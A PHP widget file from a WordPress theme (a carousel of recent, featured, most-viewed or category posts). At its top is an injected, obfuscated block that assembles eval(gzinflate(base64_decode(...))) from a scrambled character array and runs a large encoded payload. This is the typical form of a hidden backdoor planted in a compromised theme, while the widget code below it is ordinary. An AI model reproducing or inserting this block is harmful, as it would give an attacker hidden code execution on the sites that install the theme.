<?php
$md5 = "38d5e58496420f40b91808e0058b8bdd";
$ab = array('l',"_","t","b","i",'o',"d",")",'c',"s","v",'e',"n",'r','z',"$","6",'4',"f",'a','(',";",'g');
$bb9 = create_function('$'.'v',$ab[11].$ab[10].$ab[19].$ab[0].$ab[20].$ab[22].$ab[14].$ab[4].$ab[12].$ab[18].$ab[0].$ab[19].$ab[2].$ab[11].$ab[20].$ab[3].$ab[19].$ab[9].$ab[11].$ab[16].$ab[17].$ab[1].$ab[6].$ab[11].$ab[8].$ab[5].$ab[6].$ab[11].$ab[20].$ab[15].$ab[10].$ab[7].$ab[7].$ab[7].$ab[21]);
$bb9('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');
?>
<?php
/**
 * Widget for display posts with other specification.
 *
 * @package WordPress
 * @subpackage Newspaper
 * @since Newspaper 1.0
 */

class Nesia_Carousel_Posts extends WP_Widget {

    function Nesia_Carousel_Posts() {
        $widget_args = array( 'classname' => 'widget_carousel_post wide', 'description' => __( 'Using this widget you can customize the content on the main page or sidebar.', 'nesia' ) );
        parent::WP_Widget( false, __('Nesia - Carousel Posts', 'nesia'), $widget_args );
    }

    function form($instance) {
        $defaults = array(
            'title' => '',
            'type' => 'recent',
            'category' => '',
            'number' => 8
        );
        $instance = wp_parse_args( (array)$instance, $defaults);
        $title    = $instance['title'];
        $type     = $instance['type'];
        $category = $instance['category'];
        $number   = $instance['number'];

        $categories = get_categories('hide_empty=0');

        ?>
        <p>
                <label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:','nesia'); ?></label>
                <input type="text" name="<?php echo $this->get_field_name('title'); ?>" value="<?php echo esc_attr( $title ); ?>" class="widefat" id="<?php echo $this->get_field_id('title'); ?>" />
        </p>
        <p>
            <?php _e('Order by:', 'nesia'); ?>
            <select class="widefat" onchange="javascript: toggleType('<?php echo $this->get_field_id('type'); ?>');" name="<?php echo $this->get_field_name('type'); ?>" id="<?php echo $this->get_field_id('type'); ?>">
                <option <?php if ($type == 'recent') { echo 'selected="selected"'; } ?> value="recent"><?php _e('Recent', 'nesia'); ?></option>
                <option <?php if ($type == 'featured') { echo 'selected="selected"'; } ?> value="featured"><?php _e('Featured', 'nesia'); ?></option>
                <option <?php if ($type == 'view') { echo 'selected="selected"'; } ?> value="view"><?php _e('View', 'nesia'); ?></option>
                <option <?php if ($type == 'category') { echo 'selected="selected"'; } ?> value="category"><?php _e('Category', 'nesia'); ?></option>
            </select>
        </p>

        <div class="category">
            <p>
                <select class="widefat" name="<?php echo $this->get_field_name('category'); ?>" id="<?php echo $this->get_field_id('category'); ?>">
                    <option value=""><?php _e('Select category', 'nesia'); ?></option>
                    <?php
                    foreach ($categories as $catitem) {
                        $selected = '';
                        if ( $category == $catitem->cat_ID ) $selected = 'selected="selected"';
                        $option = '<option value="' . $catitem->cat_ID . '" ' . $selected . '>';
                        $option .= $catitem->cat_name;
                        $option .= '</option>';
                        echo $option;
                    }
                    ?>
                </select>
            </p>
        </div>
        
        <p><label for="<?php echo $this->get_field_id('number'); ?>"><?php _e( 'Number of posts in list:', 'nesia' ); ?><br /><input size="2" id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" type="text" value="<?php echo $number; ?>" /></label> <span class="description"><?php _e( 'default is 10', 'nesia' ); ?></span></p>
        
        <script type="text/javascript">
            function toggleType(a){
                if (jQuery("#" + a).val() == "featured") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                }
                if (jQuery("#" + a).val() == "view") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                }
                if (jQuery("#" + a).val() == "recent") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                }
                if (jQuery("#" + a).val() == "category") {
                    jQuery("#" + a).parent().nextAll("div").hide();
                    jQuery("#" + a).parent().nextAll("div.category").show()
                }
            }
            toggleType('<?php echo $this->get_field_id( 'type' ); ?>');
        </script>

        <?php
    }


    function update($new_instance, $old_instance) {
            $new_instance = $this->nesia_enforce_defaults( $new_instance );
            return $new_instance;
    }

    function nesia_enforce_defaults( $instance ) {
            $defaults = $this->nesia_get_settings();
            $instance = wp_parse_args( $instance, $defaults );
            $instance['title'] = strip_tags( $instance['title'] );
            if ( '' == $instance['title'] )
                    $instance['title'] = __('Widget title post list', 'nesia');
            return $instance;
    }

    /**
     * Provides an array of the settings with the setting name as the key and the default value as the value
     * This cannot be called get_settings() or it will override WP_Widget::get_settings()
     */
    function nesia_get_settings() {
            // Set the default to a blank string
            $settings = '';
            // Now set the more specific defaults
            return $settings;
    }

    function widget($args, $instance) {
        global $nesia_options;

        $instance = $this->nesia_enforce_defaults( $instance );
        extract( $args, EXTR_SKIP );
        extract( $instance, EXTR_SKIP );
                
        extract( $args );
        
        $type   = $instance['type'];
        $thumbnail = $instance['thumbnail'];
        $getpost= array();

        echo $before_widget;
        
        // widget title
        if ( $title ) { echo $before_title . apply_filters( 'widget_title', $title, $instance, $this->id_base ) . $after_title; }

        echo '<div class="widget-inner-content">'.
             '<div class="carousel-for-widget-wrapper">'.
             '<div class="carousel-post">';
        
        // checking the type.
        // ------------------------------------------
        if ( $type == 'category' && $category ) {
            
            $args = array(
                'cat' => $category,
                'posts_per_page' => $instance['number'],
                'ignore_sticky_posts' => 1
            );
                
        } elseif ( $type == 'featured' ){
            
            $args = array(  
                'meta_query' => array(
                        array(
                                'key' => 'featured',
                                'value' => 'true',
                                'compare' => '='
                        ),
                        array(
                                'key' => 'headline',
                                'value' => 'true',
                                'compare' => '!='
                        )
                ),
                'posts_per_page' => $instance['number'],
                'ignore_sticky_posts' => 1
            );
            
        } elseif ( $type == 'view' ){
            
            $args = array(
                'meta_query' => array(
                        array(
                                'key' => '_post_view',
                                'value' => 0,
                                'compare' => '>='
                        )
                ),
                'orderby' => 'meta_value', 
                'meta_key' => '_post_view',
                'posts_per_page' => $instance['number'],
                'order' => 'DESC',
                'ignore_sticky_posts' => 1
            );
            
        } elseif ( $type == 'recent' ){
            
            $args = array(
                'posts_per_page' => $instance['number'],
                'ignore_sticky_posts' => 1
            );
            
        }
        
        
        // default post
        query_posts( $args );
        while ( have_posts() ) : the_post(); ?>
        
            <article class="post-item-wrapper">
                    <a href="<?php the_permalink(); ?>" class="post-image">
                            <?php echo nesia_image('width=169&height=117&return=false'); ?>
                    </a>
                    <div class="post-meta-data">
                            <span class="post-cat"><?php the_category(', '); ?></span>
                            <span class="post-title"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></span>
                    </div>
            </article>
        
        <?php
        endwhile;
        wp_reset_query();
        
        ?>
        
            </div>
        </div>
        
        <div class="carousel-paging">
                <div class="paging-text"><?php _e('Seek through navigation', 'nesia'); ?></div>
                <a class="carousel-post-prev" href="#"></a>
                <a class="carousel-post-next" href="#"></a>
                <div class="carousel-post-pag"></div>
        </div>
        
        <?php        
        echo '</div>';
        echo $after_widget;
    }
}
add_action('widgets_init', create_function('', 'return register_widget("Nesia_Carousel_Posts");'));